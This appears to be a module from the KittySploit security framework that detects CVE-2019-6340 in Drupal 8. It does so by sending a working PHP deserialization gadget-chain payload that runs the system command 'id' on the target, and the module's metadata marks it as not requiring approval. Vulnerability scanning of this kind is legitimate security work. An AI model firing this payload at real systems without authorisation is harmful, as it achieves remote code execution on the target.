#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Drupal 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Drupal - Remote Code Execution Detection',
        'description': 'Drupal 8.5.x before 8.5.11 and Drupal 8.6.x before 8.6.10 V contain certain field types that do not properly sanitize data from non-form sources, which can lead to arbitrary PHP code execution in some cases.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'drupal', 'rce', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.drupal.org/sa-core-2019-003',
            'https://www.synology.com/security/advisory/Synology_SA_19_09',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-6340',
            'https://www.exploit-db.com/exploits/46452/',
            'https://github.com/CVEDB/PoC-List',
        ],
        'cve': 'CVE-2019-6340',
    }

    def run(self):
        path = '/node/1?_format=hal_json'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='{ "link": [ { "value": "link", "options": "O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{s:33:\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\";a:1:{s:5:\\"close\\";a:2:{i:0;O:23:\\"GuzzleHttp\\\\HandlerStack\\":3:{s:32:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\";s:2:\\"id\\";s:30:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\";a:1:{i:0;a:1:{i:0;s:6:\\"system\\";}}s:31:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\";b:0;}i:1;s:7:\\"resolve\\";}}s:9:\\"_fn_close\\";a:2:{i:0;r:4;i:1;s:7:\\"resolve\\";}}" } ], "_links": { "type": { "href": "http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default" } } }')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('uid=', 'gid=', 'groups=',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='high',
                reason='Drupal - Remote Code Execution detected',
                path=path,
            )
            return True
        return False

